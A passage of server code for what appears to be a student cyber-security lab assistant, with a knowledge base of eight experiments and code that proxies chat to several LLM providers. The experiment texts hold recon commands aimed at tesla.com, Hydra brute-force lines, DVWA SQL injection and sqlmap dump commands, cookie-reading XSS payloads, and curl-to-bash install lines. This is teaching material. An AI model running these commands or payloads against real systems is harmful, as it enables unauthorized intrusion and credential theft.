main.innerHTML = renderCurlView();\n      else main.innerHTML = renderExperimentView();\n\n      bindCopyButtons(main);\n\n      main.querySelectorAll(\"[data-goto]\").forEach((btn) => {\n        btn.addEventListener(\"click\", () => {\n          state.expId = Number(btn.getAttribute(\"data-goto\"));\n          render();\n          window.scrollTo({ top: 0, behavior: \"smooth\" });\n        });\n      });\n\n      main.querySelectorAll(\".open-exp-btn\").forEach((btn) => {\n        btn.addEventListener(\"click\", () => {\n          state.expId = Number(btn.getAttribute(\"data-open\"));\n          state.mode = \"full\";\n          render();\n          window.scrollTo({ top: 0, behavior: \"smooth\" });\n        });\n      });\n\n      const sInput = document.getElementById(\"searchInput\");\n      const sBtn = document.getElementById(\"searchBtn\");\n      if (sInput && sBtn) {\n        const triggerSearch = () => {\n          state.searchQuery = sInput.value;\n          render();\n        };\n        sBtn.addEventListener(\"click\", triggerSearch);\n        sInput.addEventListener(\"keydown\", (e) => {\n          if (e.key === \"Enter\") {\n            e.preventDefault();\n            triggerSearch();\n          }\n        });\n      }\n\n      const aiInput = document.getElementById(\"aiInput\");\n      const aiSendBtn = document.getElementById(\"aiSendBtn\");\n      const clearChatBtn = document.getElementById(\"clearChatBtn\");\n      if (aiInput && aiSendBtn) {\n        aiSendBtn.addEventListener(\"click\", () => askServerAi(aiInput.value));\n        aiInput.addEventListener(\"keydown\", (e) => {\n          if (e.key === \"Enter\") {\n            e.preventDefault();\n            askServerAi(aiInput.value);\n          }\n        });\n      }\n      if (clearChatBtn) {\n        clearChatBtn.addEventListener(\"click\", () => askServerAi(\"clear\"));\n      }\n    }\n\n    document.querySelectorAll(\".mode-btn\").forEach((btn) => {\n      btn.addEventListener(\"click\", () => {\n        state.mode = btn.getAttribute(\"data-mode\");\n        render();\n      });\n    });\n\n    document.getElementById(\"fontDownBtn\").addEventListener(\"click\", () => {\n      state.scale = Math.max(0.85, Number((state.scale - 0.1).toFixed(2)));\n      applyPrefs();\n    });\n\n    document.getElementById(\"fontUpBtn\").addEventListener(\"click\", () => {\n      state.scale = Math.min(1.45, Number((state.scale + 0.1).toFixed(2)));\n      applyPrefs();\n    });\n\n    document.getElementById(\"themeBtn\").addEventListener(\"click\", () => {\n      state.theme = state.theme === \"dark\" ? \"light\" : \"dark\";\n      applyPrefs();\n    });\n\n    document.getElementById(\"cmdForm\").addEventListener(\"submit\", (e) => {\n      e.preventDefault();\n      const input = document.getElementById(\"cmdInput\");\n      const raw = input.value.trim();\n      input.value = \"\";\n      if (!raw) return;\n\n      const clean = raw.replace(/^\\.?\\/?s7\\s*/i, \"\").trim();\n      const lower = clean.toLowerCase();\n\n      if (/^[1-8]$/.test(lower)) {\n        state.expId = Number(lower);\n        state.mode = \"full\";\n      } else if (/^p([1-7])$/.test(lower)) {\n        state.expId = Number(lower.slice(1)) + 1;\n        state.mode = \"full\";\n      } else if (/^c(?:\\s+([1-8]))?$/.test(lower)) {\n        const m = lower.match(/^c(?:\\s+([1-8]))?$/);\n        if (m[1]) state.expId = Number(m[1]);\n        state.mode = \"cmds\";\n      } else if (lower === \"f\" || lower === \"full\") {\n        state.mode = \"full\";\n      } else if (lower === \"n\" || lower === \"next\") {\n        state.expId = state.expId < 8 ? state.expId + 1 : 1;\n      } else if (lower === \"p\" || lower === \"prev\") {\n        state.expId = state.expId > 1 ? state.expId - 1 : 8;\n      } else if (lower.startsWith(\"s \")) {\n        state.searchQuery = clean.slice(2).trim();\n        state.mode = \"search\";\n      } else if (lower === \"s\" || lower === \"search\") {\n        state.mode = \"search\";\n      } else if (lower.startsWith(\"ai \") || lower.startsWith(\"a \")) {\n        const q = clean.replace(/^(ai|a)\\s+/i, \"\");\n        state.mode = \"ai\";\n        render();\n        askServerAi(q);\n        return;\n      } else if (lower === \"ai\" || lower === \"a\") {\n        state.mode = \"ai\";\n      } else if (lower === \"help\" || lower === \"h\" || lower === \"curl\") {\n        state.mode = \"curl\";\n      } else {\n        state.mode = \"ai\";\n        render();\n        askServerAi(raw);\n        return;\n      }\n      render();\n      window.scrollTo({ top: 0, behavior: \"smooth\" });\n    });\n\n    render();\n  </script>\n</body>\n</html>\n";

// ─── Server-Side RAG Knowledge Base (Extracted from Lab Record PDF) ──────────
const LAB_INDEX = `S7 Cyber Security Lab Syllabus (8 Experiments):
Exp 1: Familiarization of Application Penetration Testing (Theory: Passive vs Active Recon, Ethics)
Exp 2 (Practical 1): Reconnaissance & Info Gathering Using Recon-ng (tesla.com)
Exp 3 (Practical 2): Network Footprinting & Enumeration (Maltego, Nmap, Gobuster, FFUF)
Exp 4 (Practical 3): OSINT-Based Enumeration of Web Infrastructure (DNSRecon, theHarvester, Dig, Google Dorks)
Exp 5 (Practical 4): Web App Testing using WPScan, OWASP ZAP, NVD & Hydra
Exp 6 (Practical 5): Auth, Authorization & Identity Flaws in OWASP Juice Shop (Burp Intruder)
Exp 7 (Practical 6): SQL Injection & Blind SQL Injection in DVWA (Manual & SQLMap)
Exp 8 (Practical 7): Client-Side Testing in DVWA (HTML Injection, JS Execution, Reflected/Stored/DOM XSS)`;

const LAB_RAG_DOCS = [
  {
    id: 1,
    patterns: [/\bexp(eriment)?\s*1\b/i, /\bfamiliarization\b/i, /\bpassive\b/i, /\bactive recon/i, /\bethic/i],
    keywords: ["passive", "active", "reconnaissance", "ethics", "authorization", "scope", "shodan", "nikto", "dirbuster"],
    content: `Experiment 1: Familiarization of Application Penetration Testing
Aim: Familiarize with application pentesting concepts, recon tools, and ethical rules.
- Application Penetration Testing: Simulating real-world attacks on web/mobile apps to find insecure coding, misconfigurations, auth flaws, and data leaks.
- Passive Reconnaissance: Gathering info without directly touching the target (WHOIS, search engines, Shodan, breach DBs). Tools: theHarvester, Maltego, Recon-ng, Shodan.
- Active Reconnaissance: Directly probing the target for open ports, services, and directories. Tools: Nmap, Burp Suite, OWASP ZAP, Nikto, DirBuster, Gobuster, FFUF.
- Ethical Considerations: Must have written authorization, strictly follow scope, avoid DoS/data loss, and report responsibly.`,
  },
  {
    id: 2,
    patterns: [/\bexp(eriment)?\s*2\b/i, /\bpract(ical)?\s*1\b/i, /\brecon-?ng\b/i, /\bhackertarget\b/i, /\bwhois_pocs\b/i, /\bbrute_hosts\b/i, /\bbing_domain_web\b/i],
    keywords: ["recon-ng", "workspaces", "testspace", "marketplace", "hackertarget", "whois_pocs", "brute_hosts", "bing_domain_web", "tesla.com"],
    content: `Experiment 2 (Practical 1): Reconnaissance and Information Gathering Using Recon-ng
Target: tesla.com | Tool: Recon-ng
 Modules Used:
1. recon/domains-hosts/hackertarget (Subdomain enumeration using HackerTarget)
2. recon/domains-contacts/whois_pocs (WHOIS Point of Contact extraction)
3. recon/domains-hosts/brute_hosts (Brute-force subdomain discovery)
4. recon/domains-hosts/bing_domain_web (Subdomain discovery via Bing search)
Procedure & Commands:
  sudo apt update && sudo apt install -y recon-ng
  recon-ng
  workspaces create testspace
  workspaces select testspace
  marketplace search
  marketplace install recon/domains-hosts/hackertarget
  marketplace install recon/domains-contacts/whois_pocs
  marketplace install recon/domains-hosts/brute_hosts
  marketplace install recon/domains-hosts/bing_domain_web
  modules load recon/domains-hosts/hackertarget
  options set SOURCE tesla.com
  run
  modules load recon/domains-contacts/whois_pocs
  options set SOURCE tesla.com
  run
  modules load recon/domains-hosts/brute_hosts
  options set SOURCE tesla.com
  run
  modules load recon/domains-hosts/bing_domain_web
  options set SOURCE tesla.com
  run
  show hosts
  show contacts`,
  },
  {
    id: 3,
    patterns: [/\bexp(eriment)?\s*3\b/i, /\bpract(ical)?\s*2\b/i, /\bmaltego\b/i, /\bnmap\b/i, /\bgobuster\b/i, /\bffuf\b/i, /\bfootprinting\b/i],
    keywords: ["maltego", "nmap", "gobuster", "ffuf", "common.txt", "vulnweb", "footprint", "ports", "dirb"],
    content: `Experiment 3 (Practical 2): Network Footprinting & Enumeration Using Maltego, Nmap, Gobuster, FFUF
Target: testphp.vulnweb.com / <Lab-Target-IP>
1. Maltego (Passive OSINT): Launch 'maltego' -> Machines > Run Machine > Footprint L1 -> domain: testphp.vulnweb.com.
2. Nmap Flags & Commands:
   -sn (Ping scan / host discovery), -sV (Service versions), -p (Specific ports), -p- (All 65535 ports),
   -A (Aggressive: OS + version + script scan + traceroute), -Pn (Treat host as online), -T4 (Faster speed), -O (OS detection), -F (Fast top 100 ports).
   Commands:
   sudo nmap -sn <Target-IP>/24
   sudo nmap -sV -O -p- -A -T4 <TARGET-IP>
   sudo nmap -sV -p 80,443 -A -T4 testphp.vulnweb.com
   sudo nmap -F testphp.vulnweb.com
3. Gobuster Directory Enumeration:
   gobuster dir -u http://<lab-machine-ip> -w /usr/share/wordlists/dirb/common.txt
4. FFUF Directory Fuzzing:
   ffuf -u http://testphp.vulnweb.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
Ubuntu Wordlist Setup:
   sudo mkdir -p /usr/share/wordlists/dirb && sudo curl -sL https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt -o /usr/share/wordlists/dirb/common.txt`,
  },
  {
    id: 4,
    patterns: [/\bexp(eriment)?\s*4\b/i, /\bpract(ical)?\s*3\b/i, /\bdnsrecon\b/i, /\btheharvester\b/i, /\bdig\b/i, /\bdork/i],
    keywords: ["dnsrecon", "theharvester", "dig", "dork", "inurl", "intitle", "filetype", "mx", "ns", "soa", "seclists"],
    content: `Experiment 4 (Practical 3): OSINT-Based Enumeration of Web Infrastructure
Tools: DNSRecon, theHarvester, Dig, Google Dorking | Target: tesla.com / testphp.vulnweb.com
Step 1: DNSRecon (enumerates NS, A, MX, SOA, TXT/SPF and brute-forces subdomains):
  dnsrecon -d tesla.com
  dnsrecon -d tesla.com -t std --xml tesla_dns.xml
  dnsrecon -d tesla.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
Step 2: theHarvester (email & subdomain gathering):
  theHarvester -d tesla.com -b bing
Step 3: Dig Manual DNS Queries:
  dig tesla.com
  dig +short NS tesla.com
  dig +short MX tesla.com
Step 4: Google Dorking (inurl:, intitle:, filetype:, site:, intext:):
  inurl:admin site:tesla.com
  intitle:"login" site:tesla.com
  inurl:login site:testphp.vulnweb.com
  filetype:php inurl:admin
  site:github.com inurl:login`,
  },
  {
    id: 5,
    patterns: [/\bexp(eriment)?\s*5\b/i, /\bpract(ical)?\s*4\b/i, /\bwpscan\b/i, /\bzap(roxy)?\b/i, /\bhydra\b/i, /\bnvd\b/i, /\bwordpress\b/i],
    keywords: ["wpscan", "zap", "zaproxy", "hydra", "nvd", "cve", "cwe", "wordpress", "wp-login", "fsocity", "rockyou", "elliot"],
    content: `Experiment 5 (Practical 4): Web App Testing using WPScan, OWASP ZAP, NVD & Hydra
Definitions:
- NVD (National Vulnerability Database): https://nvd.nist.gov/ repository of CVEs, CVSS severity, and mitigations.
- CVE: Unique vulnerability ID (e.g., CVE-2024-12345).
- CWE: Flaw category (e.g., CWE-79 = XSS, CWE-89 = SQL Injection).
Step 1: WPScan (u = usernames, vp = vulnerable plugins, vt = vulnerable themes):
  wpscan --url http://<target-ip> --enumerate u,vp,vt
Step 2: Validate CVEs in NVD (https://nvd.nist.gov/).
Step 3: OWASP ZAP (zaproxy):
  Proxy on 127.0.0.1:8080 -> Traditional Spider (HTML) & AJAX Spider (JS) -> Passive Scan & Active Scan (XSS, SQLi, missing headers, insecure cookies).
Step 4: Brute-Force Login with Hydra:
  sort fsocity.dic | uniq > fsocity.dic.uniq
  hydra -L /usr/share/wordlists/rockyou.txt -p blah <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
  hydra -l elliot -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid password'`,
  },
  {
    id: 6,
    patterns: [/\bexp(eriment)?\s*6\b/i, /\bpract(ical)?\s*5\b/i, /\bjuice\s*shop\b/i, /\bcluster\s*bomb\b/i, /\bintruder\b/i, /\bsamuel\b/i, /\bjim\b/i, /\ballow_hijacking_localhost\b/i],
    keywords: ["juice", "juice-shop", "burp", "intruder", "cluster", "samuel", "jim", "localhost", "about:config", "lockout", "42000"],
    content: `Experiment 6 (Practical 5): Auth, Authorization & Identity Flaws in OWASP Juice Shop
Target: http://127.0.0.1:42000 (or Docker: sudo docker run --rm -d -p 42000:3000 --name juice-shop bkimminich/juice-shop)
Firefox Localhost Proxy Fix for Burp Suite (127.0.0.1:8080):
  Open about:config in Firefox -> set network.proxy.allow_hijacking_localhost = true.
Step 1: Test Role Definitions (/administration -> 403 Forbidden for normal user).
Step 2: Test User Registration & Account Enumeration (check product reviews for exposed emails like jim@juice-sh.op, admin@juice-sh.op).
Step 3: Default Credentials & Brute-Force with Burp Intruder (Cluster Bomb):
  - Capture login POST request -> Send to Intruder -> Clear § -> Mark username & password: username=§USERNAME§&password=§PASSWORD§
  - Attack Type: Cluster Bomb (or Sniper with admin@juice-sh.op).
  - Uncheck '.' (dot) from Payload Encoding in Payloads tab.
  - Payload Set 1 (Usernames): admin@juice-sh.op, administrator@juice-sh.op, root@juice-sh.op, user@juice-sh.op, test@juice-sh.op, guest@juice-sh.op, manager@juice-sh.op, support@juice-sh.op, security@juice-sh.op
  - Payload Set 2 (Passwords): admin, password, 123456, juice, welcome, admin123
  - Result: HTTP 200 OK on admin@juice-sh.op : admin123.
Step 4: Weak Lockout (10+ failed logins), Browser Cache (Back button after logout), & Jim's Password Reset (OSINT):
  - Jim's Green Smoothie review mentions "replicator" (Star Trek -> James T. Kirk).
  - Forgot Password for jim@juice-sh.op asks "Eldest brother's middle name?" -> Answer: Samuel (George Samuel Kirk).`,
  },
  {
    id: 7,
    patterns: [/\bexp(eriment)?\s*7\b/i, /\bpract(ical)?\s*6\b/i, /\bsqli?\b/i, /\bsql\s*injection\b/i, /\bsqlmap\b/i, /\bblind\b/i],
    keywords: ["sqli", "sql", "sqlmap", "blind", "union", "information_schema", "dvwa", "phpsessid", "version()", "substring"],
    content: `Experiment 7 (Practical 6): SQL Injection and Blind SQL Injection in DVWA
Target: http://localhost/DVWA (Login: admin / password, Security Level: Low)
Install DVWA:
  sudo bash -c "$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)"
  (or Docker: sudo docker run --rm -d -p 80:80 --name dvwa vulnerables/web-dvwa)
Part A — Classic SQL Injection Payloads:
  Step 5 (Trigger error): 1'
  Step 6 (Auth bypass / all users): 1' AND 1=2 #   and   1' OR '1'='1
  Step 7 (Database version): 1' UNION SELECT null, version() #
  Step 8 (List tables): 1' UNION SELECT null, table_name FROM information_schema.tables #
  Step 8 (List columns of users): 1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #
  Dump users & hashes: 1' UNION SELECT user, password FROM users #
Part B — Blind SQL Injection Payloads:
  Step 10: 1'
  Step 11 (Boolean True vs False): 1' AND 1=1 #  (True) vs  1' AND 1=2 #  (False)
  Step 12 (Char-by-char database name check): 1' AND SUBSTRING(database(),1,1)='d' #
  Step 13.1 (SQLMap list DBs):
    sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" --dbs --batch
  Step 13.2 (SQLMap list tables in dvwa):
    sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -p id -D dvwa --tables --batch --threads 5
  Step 14 (SQLMap dump users table & crack MD5 hashes like admin:password, gordonb:abc123):
    sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -D dvwa -T users --dump --batch --threads 5`,
  },
  {
    id: 8,
    patterns: [/\bexp(eriment)?\s*8\b/i, /\bpract(ical)?\s*7\b/i, /\bxss\b/i, /\bclient-?side\b/i, /\bhtml\s*injection\b/i, /\bdocument\.cookie\b/i],
    keywords: ["xss", "stored", "reflected", "dom", "html", "cookie", "onmouseover", "onerror", "iframe", "guestbook"],
    content: `Experiment 8 (Practical 7): Client-Side Testing (HTML Injection & XSS in DVWA)
Target: http://localhost/dvwa/ (Login: admin / password, Security Level: Low)
Step 2 — HTML Injection (in XSS Stored):
  <h1>Website Defaced by Student</h1>
Step 3 — JavaScript Execution & Cookie Theft (in XSS Stored — increase maxlength in Inspect Element if needed):
  <script>alert('JavaScript Executed!')</script>
  <script>alert('Cookies: ' + document.cookie)</script>
Step 4 — Reflected XSS (in XSS Reflected):
  <button onclick="alert('1')">Click Me!</button>
Step 5 — DOM-Based XSS (in XSS DOM, modify URL default= parameter):
  http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
Step 6 — Stored XSS (Compact Event Handler) & Alternative Filter-Bypass Payloads:
  <div onmouseover=alert(1)>Hover</div>
  <img src=x onmouseover=alert('XSS')>
  <img src=invalidImage onerror=alert('XSS')>
  <input autofocus onfocus=alert('XSS')>
  <body onload=alert('XSS')>
  <a href="javascript:alert('XSS')">Click Me</a>
  <iframe src="javascript:alert('Iframe XSS')"></iframe>`,
  },
];

function retrieveLabRAG(query, history = [], activeExp = "") {
  const combined = `${activeExp ? `exp ${activeExp} ` : ""}${query} ${
    history.slice(-2).map((h) => h.content || "").join(" ")
  }`.toLowerCase();

  const scored = LAB_RAG_DOCS.map((doc) => {
    let score = 0;
    if (activeExp && String(doc.id) === String(activeExp)) score += 100;
    for (const pat of doc.patterns) {
      if (pat.test(combined)) score += 30;
    }
    for (const kw of doc.keywords) {
      if (combined.includes(kw)) score += 10;
    }
    return { doc, score };
  })
    .filter((x) => x.score > 0)
    .sort((a, b) => b.score - a.score);

  if (scored.length === 0) {
    return `${LAB_INDEX}`;
  }

  const topDocs = scored.slice(0, 2).map((x) => x.doc.content);
  return `${LAB_INDEX}\n\nRetrieved Lab Manual Context (RAG):\n${topDocs.join("\n\n---\n\n")}`;
}

async function fetchWebContext(query) {
  const results = [];
  const sources = [];
  try {
    const ddgUrl = `https://api.duckduckgo.com/?q=${encodeURIComponent(query)}&format=json&no_html=1&skip_disambig=1`;
    const ddgResp = await fetch(ddgUrl, { headers: { "User-Agent": "S7-Lab-Proxy/1.0" } });
    if (ddgResp.ok) {
      const ddg = await ddgResp.json();
      if (ddg.AbstractText) {
        results.push(`Summary: ${ddg.AbstractText}`);
        if (ddg.AbstractURL) sources.push(ddg.AbstractURL);
      }
      if (Array.isArray(ddg.RelatedTopics)) {
        for (const t of ddg.RelatedTopics.slice(0, 3)) {
          if (t.Text) results.push(`- ${t.Text}`);
          if (t.FirstURL) sources.push(t.FirstURL);
        }
      }
    }
  } catch (_) {}

  return {
    contextText: results.length > 0 ? `Live Web Results:\n${results.join("\n")}` : "",
    sources: [...new Set(sources)].slice(0, 4),
  };
}

async function callGemini({ apiKey, model, prompt, system, history }) {
  const candidateModels = model
    ? [model, ...FREE_TIER_GEMINI_MODELS.filter((m) => m !== model)]
    : FREE_TIER_GEMINI_MODELS;

  const contents = [];
  if (Array.isArray(history)) {
    for (const h of history) {
      if (!h || !h.content) continue;
      contents.push({
        role: h.role === "assistant" ? "model" : "user",
        parts: [{ text: String(h.content) }],
      });
    }
  }
  contents.push({ role: "user", parts: [{ text: prompt }] });

  const keys = String(apiKey).split(",").map((k) => k.trim()).filter(Boolean);
  const lastErrors = [];
  for (const k of keys) {
  for (const modelName of candidateModels) {
    const url = `https://generativelanguage.googleapis.com/v1beta/models/${modelName}:generateContent?key=${k}`;
    const isGemma = modelName.startsWith("gemma-");
    const body = isGemma
      ? {
          contents: [
            ...(system ? [{ role: "user", parts: [{ text: `System Instruction:\n${system}` }] }] : []),
            ...contents,
          ],
        }
      : {
          contents,
          systemInstruction: system ? { parts: [{ text: system }] } : undefined,
        };

    const resp = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });

    if (resp.ok) {
      const data = await resp.json();
      const candidate = (data.candidates && data.candidates[0]) || {};
      const parts = (candidate.content && candidate.content.parts) || [];
      const textParts = parts.filter((p) => !p.thought).map((p) => p.text || "");
      const reply = (textParts.length ? textParts : parts.map((p) => p.text || "")).join("\n").trim();
      return { reply, provider: `gemini (${modelName})`, sources: [] };
    }

    const errText = await resp.text();
    lastErrors.push(`${modelName} -> HTTP ${resp.status}: ${errText.slice(0, 150)}`);
  }
  }

  throw new Error(lastErrors.join(" | "));
}

const FREE_TIER_GROQ_MODELS = ["openai/gpt-oss-120b", "openai/gpt-oss-20b", "qwen/qwen3.8-27b"];

async function callOpenAICompatible({ endpoint, apiKey, model, prompt, system, history, providerLabel }) {
  const messages = [];
  if (system) messages.push({ role: "system", content: system });
  if (Array.isArray(history)) {
    for (const h of history) {
      if (h && h.content) {
        messages.push({ role: h.role === "assistant" ? "assistant" : "user", content: String(h.content) });
      }
    }
  }
  messages.push({ role: "user", content: prompt });

  const modelsToTry =
    providerLabel === "groq"
      ? [model, ...FREE_TIER_GROQ_MODELS.filter((m) => m !== model)].filter(Boolean)
      : [model];
  const keys = String(apiKey).split(",").map((k) => k.trim()).filter(Boolean);
  const errs = [];

  for (const k of keys) {
    for (const m of modelsToTry) {
      const resp = await fetch(endpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${k}`,
        },
        body: JSON.stringify({ model: m, messages, temperature: 0.3 }),
      });

      if (resp.ok) {
        const data = await resp.json();
        const rawReply = data.choices?.[0]?.message?.content || "";
        const reply = rawReply.replace(/<think>[\s\S]*?<\/think>/gi, "").trim();
        return { reply, provider: `${providerLabel} (${m})`, sources: [] };
      }
      const errText = await resp.text();
      errs.push(`${m} -> HTTP ${resp.status}: ${errText.slice(0, 120)}`);
    }
  }
  throw new Error(errs.join(" | "));
}

async function handleAIRequest(reqBody, env, reqHeaders, sessionId = "default") {
  const prompt = (reqBody.prompt || reqBody.q || "").trim();
  if (!prompt) {
    return { error: "Missing 'prompt' in request body.", status: 400 };
  }

  if (prompt.toLowerCase() === "clear" || prompt.toLowerCase() === "/clear") {
    SESSION_MEMORY.delete(sessionId);
    return { data: { reply: "Conversation history cleared.", provider: "rag-session", sources: [] }, status: 200 };
  }

  const storedHistory = SESSION_MEMORY.get(sessionId) || [];
  const history = Array.isArray(reqBody.history) && reqBody.history.length > 0 ? reqBody.history : storedHistory;
  const activeExp = reqBody.exp || reqHeaders["x-exp"] || "";
  const cacheKey = `${activeExp}:${prompt.toLowerCase().replace(/\s+/g, " ").slice(-240)}`;
  if (RESPONSE_CACHE.has(cacheKey)) {
    return { data: RESPONSE_CACHE.get(cacheKey), status: 200 };
  }

  // 1. Retrieve relevant Lab Manual chunks via Server-Side RAG (skip duplicate chunk if client already attached Local RAG)
  const hasClientRAG = Boolean(reqHeaders["x-client-rag"]) || prompt.includes("Local Lab Context (RAG):");
  const ragContext = hasClientRAG ? LAB_INDEX : retrieveLabRAG(prompt, history, activeExp);
  let system = `You are a concise, terminal-friendly Cyber Security Lab Assistant for Ubuntu Linux & Kali. Give brief, copy-paste ready terminal commands and payloads without fluff.\n\n${ragContext}`;

  // 2. Enrich with live DuckDuckGo web context if enabled
  let webSources = [];
  if (reqBody.search !== false) {
    const webData = await fetchWebContext(prompt);
    if (webData.contextText) {
      system += `\n\n${webData.contextText}`;
      webSources = webData.sources;
    }
  }

  const requestedProvider = (reqBody.provider || reqHeaders["x-provider"] || "auto").toLowerCase();
  const passKey = reqHeaders["x-api-key"] || reqBody.api_key || "";

  const geminiKey =
    (requestedProvider === "gemini" && passKey) ||
    env.GEMINI_API_KEY ||
    (passKey.startsWith("AIza") || passKey.startsWith("AQ.") ? passKey : "");
  const groqKey = (requestedProvider === "groq" && passKey) || env.GROQ_API_KEY || (passKey.startsWith("gsk_") ? passKey : "");
  const openaiKey =
    (requestedProvider === "openai" && passKey) ||
    env.OPENAI_API_KEY ||
    (passKey.startsWith("sk-") && !passKey.startsWith("sk-or-") ? passKey : "");
  const openrouterKey =
    (requestedProvider === "openrouter" && passKey) ||
    env.OPENROUTER_API_KEY ||
    (passKey.startsWith("sk-or-") ? passKey : "");

  const attempts = [];

  if ((requestedProvider === "auto" || requestedProvider === "gemini") && geminiKey) {
    attempts.push(() =>
      callGemini({
        apiKey: geminiKey,
        model: reqBody.model || env.GEMINI_MODEL || "gemini-3.5-flash-lite",
        prompt,
        system,
        history,
      })
    );
  }
  if ((requestedProvider === "auto" || requestedProvider === "groq") && groqKey) {
    attempts.push(() =>
      callOpenAICompatible({
        endpoint: "https://api.groq.com/openai/v1/chat/completions",
        apiKey: groqKey,
        model: reqBody.model || env.GROQ_MODEL || "openai/gpt-oss-120b",
        prompt,
        system,
        history,
        providerLabel: "groq",
      })
    );
  }
  if ((requestedProvider === "auto" || requestedProvider === "openai") && openaiKey) {
    attempts.push(() =>
      callOpenAICompatible({
        endpoint: "https://api.openai.com/v1/chat/completions",
        apiKey: openaiKey,
        model: reqBody.model || env.OPENAI_MODEL || "gpt-4o-mini",
        prompt,
        system,
        history,
        providerLabel: "openai",
      })
    );
  }
  if ((requestedProvider === "auto" || requestedProvider === "openrouter") && openrouterKey) {
    attempts.push(() =>
      callOpenAICompatible({
        endpoint: "https://openrouter.ai/api/v1/chat/completions",
        apiKey: openrouterKey,
        model: reqBody.model || env.OPENROUTER_MODEL || "google/gemini-2.5-flash",
        prompt,
        system,
        history,
        providerLabel: "openrouter",
      })
    );
  }

  if (attempts.length === 0) {
    return {
      error: "No API key configured on Vercel server. Set GEMINI_API_KEY in Vercel Environment Variables.",
      status: 500,
    };
  }

  const errors = [];
  for (const fn of attempts) {
    try {
      const res = await fn();
      res.sources = [...new Set([...(res.sources || []), ...webSources])].slice(0, 5);
      // Save turn in server-side session memory
      const updated = [
        ...history,
        { role: "user", content: prompt },
        { role: "assistant", content: res.reply },
      ].slice(-12);
      SESSION_MEMORY.set(sessionId, updated);
      if (RESPONSE_CACHE.size > 300) RESPONSE_CACHE.delete(RESPONSE_CACHE.keys().next().value);
      RESPONSE_CACHE.set(cacheKey, res);
      return { data: res, status: 200 };
    } catch (e) {
      errors.push(e.message || String(e));
    }
  }

  return { error: `All upstream AI providers failed: ${errors.join(" | ")}`, status: 502 };
}

module.exports = async function handler(req, res) {
  for (const [k, v] of Object.entries(CORS_HEADERS)) {
    res.setHeader(k, v);
  }

  if (req.method === "OPTIONS") {
    res.statusCode = 204;
    return res.end();
  }

  const proto = req.headers["x-forwarded-proto"] || "https";
  const host = req.headers["x-forwarded-host"] || req.headers.host || "localhost:3000";
  const baseUrl = `${proto}://${host}`;
  const parsedUrl = new URL(req.url || "/", baseUrl);
  const pathName = parsedUrl.pathname;

  const sessionId =
    req.headers["x-session-id"] ||
    parsedUrl.searchParams.get("session") ||
    (req.headers["x-forwarded-for"] || "default").split(",")[0].trim();

  if (process.env.PROXY_SECRET) {
    const clientSecret = req.headers["x-proxy-secret"] || parsedUrl.searchParams.get("secret") || "";
    if (clientSecret !== process.env.PROXY_SECRET) {
      res.statusCode = 401;
      res.setHeader("Content-Type", "application/json");
      return res.end(JSON.stringify({ error: "Unauthorized: Invalid X-Proxy-Secret" }));
    }
  }

  if (pathName === "/s7" || pathName === "/cli") {
    for (const p of [path.join(__dirname, "../s7"), path.join(__dirname, "../../s7")]) {
      if (fs.existsSync(p)) {
        res.statusCode = 200;
        res.setHeader("Content-Type", "text/plain; charset=utf-8");
        return res.end(fs.readFileSync(p, "utf8"));
      }
    }
  }

  if (pathName === "/s7.ps1" || pathName === "/ps1") {
    for (const p of [path.join(__dirname, "../s7.ps1"), path.join(__dirname, "../../s7.ps1")]) {
      if (fs.existsSync(p)) {
        res.statusCode = 200;
        res.setHeader("Content-Type", "text/plain; charset=utf-8");
        return res.end(fs.readFileSync(p, "utf8"));
      }
    }
  }

  if (["/m", "/mobile", "/bus", "/terminal", "/web", "/mobile.html"].includes(pathName.toLowerCase())) {
    res.statusCode = 200;
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.setHeader("Cache-Control", "public, max-age=300");
    return res.end(MOBILE_HTML);
  }

  if (pathName === "/" || pathName === "/help" || pathName === "/health" || pathName === "/api/health") {
    const helpText = [
      "S7 Lab — Quick Terminal Cheat Sheet",
      "",
      "1. Download & Start Interactive Tool (Ubuntu / Linux):",
      `   curl -sL ${baseUrl}/s7 -o s7 && chmod +x s7 && ./s7`,
      "",
      "2. Once Downloaded, Use ./s7 Commands:",
      "   ./s7              # Interactive menu (Arrows or 1-8, c=cmds, s=search, a=AI)",
      "   ./s7 <1-8>        # Full instructions + commands for Experiment 1-8",
      "   ./s7 c <1-8>      # Commands-Only mode (e.g. ./s7 c 7)",
      "   ./s7 s <keyword>  # Search all experiments (e.g. ./s7 s hydra)",
      "   ./s7 ai           # Continuous multi-turn AI chat",
      "   ./s7 ai \"query\"   # One-line AI question",
      "   ./s7 help         # Full help & keybindings",
      "",
      "3. Direct curl Commands (Without downloading s7):",
      `   curl -sL ${baseUrl}/1   (or /2 .. /8 for any experiment)`,
      `   curl -sL ${baseUrl}/ask -d "your question here"`,
      "",
      "4. Windows PowerShell (use 'irm' or 'curl.exe', not 'curl'):",
      `   irm ${baseUrl}`,
      `   irm ${baseUrl}/s7.ps1 -OutFile s7.ps1; .\\s7.ps1`,
      `   curl.exe -sL ${baseUrl}/7`,
      "",
      "5. Mobile / Bus Terminal Reader (Open in Phone Browser):",
      `   ${baseUrl}/m`,
    ].join("\n");
    res.statusCode = 200;
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    return res.end(helpText + "\n");
  }

  // Direct curl /1 .. /8 to view experiment without downloading script
  const expMatch = pathName.match(/^\/([1-8])$/);
